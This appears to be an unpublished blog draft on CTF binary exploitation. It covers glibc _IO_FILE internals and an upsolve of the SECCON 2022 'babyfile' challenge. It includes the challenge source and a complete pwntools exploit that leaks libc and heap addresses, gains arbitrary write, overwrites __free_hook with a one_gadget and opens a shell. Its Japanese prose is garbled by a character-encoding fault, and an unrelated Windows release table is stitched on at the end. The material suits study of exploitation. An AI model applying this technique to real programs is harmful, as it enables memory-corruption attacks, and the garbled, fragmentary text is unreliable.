---
title: "ã€CTF æ¢è¨ªè¨˜ã€‘File Structure Oriented Programming"
emoji: "ğŸ“˜"
type: "tech" # tech: æŠ€è¡“è¨˜äº‹ / idea: ã‚¢ã‚¤ãƒ‡ã‚¢
topics: ["CTF", "pwn"]
published: false
---

pwn ã¨ã„ã†ã®ã¯ãƒ¡ãƒ¢ãƒªã®æ›¸ãæ›ãˆã‚„èª­ã¿å–ã‚Šãªã©ã®ä½ãƒ¬ã‚¤ãƒ¤ãƒ¼ã®è„†å¼±æ€§ã‚’ç”¨ã„ã¦æ„å›³ã—ãªã„å‹•ä½œã‚’å¼•ãèµ·ã“ã•ã›ã‚‹ç«¶æŠ€ã§æœ€ã‚‚ãƒãƒƒã‚­ãƒ³ã‚°ã£ã½ã„åˆ†é‡ã§ã™ã€‚

- [Stack Exploits](https://zenn.dev/anko/articles/ctf-stack-exploits)
- [Heap Exploits](https://zenn.dev/anko/articles/ctf-heap-exploits)

ä»Šå›ã¯

### _IO_FILE æ§‹é€ ä½“ã®æ›¸ãæ›ãˆ

```c
struct _IO_FILE
{
  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;        /* Current read pointer */
  char *_IO_read_end;        /* End of get area. */
  char *_IO_read_base;        /* Start of putback+get area. */
  char *_IO_write_base;        /* Start of put area. */
  char *_IO_write_ptr;        /* Current put pointer. */
  char *_IO_write_end;        /* End of put area. */
  char *_IO_buf_base;        /* Start of reserve area. */
  char *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

```

```c
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};

```

```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

- [ãƒ’ãƒ¼ãƒ—ç³»å•é¡Œã«ãŠã‘ã‚‹stdout / stderrã‚’åˆ©ç”¨ã—ãŸãƒ¡ãƒ¢ãƒªãƒªãƒ¼ã‚¯ - CTFã™ã‚‹ã](https://ptr-yudai.hatenablog.com/entry/2019/05/31/235444)
# babyfile upsolve

https://github.com/SECCON/SECCON2022_online_CTF

source code
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static int menu(void);
static int getnline(char *buf, int size);
static int getint(void);

#define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)

int main(void){
        FILE *fp;

        alarm(60);

        write_str("Play with FILE structure\n");

        if(!(fp = fopen("/dev/null", "r"))){
                write_str("Open error");
                return -1;
        }
        fp->_wide_data = NULL;

        for(;;){
                switch(menu()){
                        case 0:
                                goto END;
                        case 1:
                                fflush(fp);
                                break;
                        case 2:
                                {
                                        unsigned char ofs;
                                        write_str("offset: ");
                                        if((ofs = getint()) & 0x80)
                                                ofs |= 0x40;
                                        write_str("value: ");
                                        ((char*)fp)[ofs] = getint();
                                }
                                break;
                }
                write_str("Done.\n");
        }

END:
        write_str("Bye!");
        _exit(0);
}

static int menu(void){
        write_str("\nMENU\n"
                        "1. Flush\n"
                        "2. Trick\n"
                        "0. Exit\n"
                        "> ");

        return getint();
}

static int getnline(char *buf, int size){
        int len;

        if(size <= 0 || (len = read(STDIN_FILENO, buf, size-1)) <= 0)
                return -1;

        if(buf[len-1]=='\n')
                len--;
        buf[len] = '\0';

        return len;
}

static int getint(void){
        char buf[0x10] = {};

        getnline(buf, sizeof(buf));
        return atoi(buf);
}
```

/dev/null ã‚’é–‹ã„ãŸFILEæ§‹é€ ä½“ã«å¥½ãæ”¾é¡Œæ›¸ãè¾¼ã‚ã‚‹
fflushã§ãã‚‹ã¨ãã©ã†ã‚„ã£ã¦shellã«ã¤ãªã’ã‚‹ã‹

### leak

vtableã‚’ç›´æ¥æ”¹ã–ã‚“ã™ã‚‹ã®ã¯ç„¡ç†(ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒç‰¹å®šã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®ç¯„å›²å†…ã«ã‚ã‚‹ã‹ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã®ã§)
vtableã‚’ãšã‚‰ã™ã“ã¨ã¯ã§ãã‚‹

ã¨ã‚Šã‚ãˆãšheapé ˜åŸŸã®bufferã‚’ `_IO_write_*`ã«è¨­å®šã§ããŸ

glibc-2.31ã®ã‚³ãƒ¼ãƒ‰ã‚’èª­ã‚€ã¨
 `_IO_new_file_sync -> _IO_do_flush -> _IO_do_write -> ... -> new_do_write`
 ã¿ãŸã„ãªæµã‚ŒãŒã‚ã‚‹ `_IO_do_flush`ã§ã¯write_baseã‹ã‚‰write_ptrã®ä½ç½®ã¾ã§å‡ºåŠ›ã‚’åãå‡ºã™
 ãã®ãŸã‚filenoã‚’STDOUT_fileno(=1)ã«è¨­å®šã—ã¦write_baseã‚’é©å½“ã«å·»ãæˆ»ã™ã¨å‡ºåŠ›ã•ã‚Œã‚‹ã€‚
 (ã“ã®ã¨ãnew_do_writeã®åˆ†å²ã®ãŸã‚ã«read_endã‚‚write_baseã¨åŒã˜å€¤ã«ã—ã¦ãŠãå¿…è¦ãŒã‚ã‚‹)
 1/16ãªã®ã§è‹¥å¹²ã ã‚‹ã„

 leakå®Œäº†

### control PC

IO_new_file_flushã§vtableã®_IO_new_file_syncã‚’å‘¼ã³å‡ºã™ã¨
å¼•æ•°ã¯`(FILE *,int?,heap addr)`ã«ãªã‚‹ vtableé–¢æ•°ã®ä¸­ã‹ã‚‰ã“ã®å¼•æ•°ã§AAW or get PCã§ãã‚‹ã‚‚ã®ã‚’æ¢ã™ã—ã‹ãªã„

å¼•æ•°çš„ã«ã‚ã‚Šãˆãã†ãªå€™è£œ
- `_IO_finish_t(FILE *,int)`
- `_IO_overflow_t(FILE *,int)`
- `_IO_overflow_t(FILE *,int)`
- `_IO_pbackfail_t(FILE *)`
- `_IO_seekoff_t(FILE *,off64_t,int)`
- `_IO_seekpos_t(FILE *,off64_t,int)`

### toketa
```python
from pwn import *

#context.terminal = ['tmux','splitw','-h']
context.terminal = ['open_tab.sh']

read_ptr = 0x8
read_end = 0x10
read_base = 0x18
write_base = 0x20
write_ptr = 0x28
write_end = 0x30

while True:
    io = process('./chall')

    def fflush():
        io.sendlineafter(b'> ',b'1')

    def overwrite(off,val):
        io.sendlineafter(b'> ',b'2')
        io.sendlineafter(b'offset: ',str(off).encode())
        io.sendlineafter(b'value: ',str(val).encode())

    def overwrite_word(off,val):
        for i in range(8):
            overwrite(off+i,val & 0xff)
            val >>= 8

    fflush()
    fflush()

    overwrite(0xd8,0xa8)
    fflush()

    log.info("called _IO_file_doallocate")

    overwrite(0xd8,0x60)
    fflush()

    log.info("called _IO_file_underflow")

    overwrite(0xd8,0xa0)
    overwrite(0x70,0x1)
    overwrite(0x20,0x90)
    overwrite(0x21,0x12)
    overwrite(0x10,0x90)
    overwrite(0x11,0x12)

    log.info("overwrite read_end,write_base")

    fflush()

    log.info("leak by _IO_new_file_sync")

    buf = io.recv(0x80)
    if len(buf) != 0x80:
        io.close()
        continue

    libc_base = u64(buf[0x78:0x80]) + 0x7f13af008000 - 0x7f13af1f55c0
    heap_base = u64(buf[0x18:0x20]) + 0x564653a51000 - 0x564653a5350f
    log.info(f'libc_base = {hex(libc_base)}')
    log.info(f'heap_base = {hex(heap_base)}')

    gdb.attach(io,'''
            b *main+121
            c
            set $foo = *((long *)$rsp + 1)
    ''')

    input()

    def AAW(addr,val):
        overwrite_word(0xd8,libc_base + 0x7f30d22140e0 - 0x7f30d202b000)
        overwrite_word(0xf0,addr)
        overwrite_word(0xf8,addr)
        overwrite_word(write_base,0)
        overwrite_word(write_ptr,val)
        fflush()

    free_hook = libc_base + 0x7f6822dbde48 - 0x7f6822bcf000
    one_gadget = libc_base + 0xe3b01

    AAW(free_hook,one_gadget)

    log.info('overwrite free_hook')

    IO_file_jumps = libc_base + 0x7fba711e64a0 - 0x7fba70ffd000

    overwrite_word(0xd8,IO_file_jumps - 0x50)
    overwrite_word(0x70,0xffffffffffffffff)

    log.info('prepared finish->free')

    fflush()

    io.interactive()

    break
```

https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique

Windows OS ã®æ­´å²

| ãƒãƒ¼ã‚¸ãƒ§ãƒ³ | ç™ºå£²æ—¥ | èª¬æ˜ |
| --- | --- | --- |
| Windows 1.x | 1985/11/20 |
| Windows 2.x | 1987/12/9 |
| Windows 3.x | 1990/5/22 |
| Windows NT | 1993/7/27 | Graphics Device (GDI) |
| Windows 95 | 1995/8/24 |
| Windows 98 | 1998/6/25 |
| Windows 2000 | 1999/12/15 | 9xç³» NTç³»ã®è„†å¼±æ€§ã¯æ·±åˆ»ãªç¤¾ä¼šå•é¡Œ |
| Windows XP | 2001/8/24 | Service Pack2 (SP2) ã¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ”¹è‰¯ |
| Windows Vista | 2006/11/30 | |
| Windows 7 | 2009/9/1 |
| Windows 8 | 2012/8/16 |
| Windows 10 | 2015/7/29 | EMET ã‚µãƒãƒ¼ãƒˆçµ‚äº† Exploit Protection é–‹å§‹ |
| Windows 11 | 2021/10/5 |

Service Pack
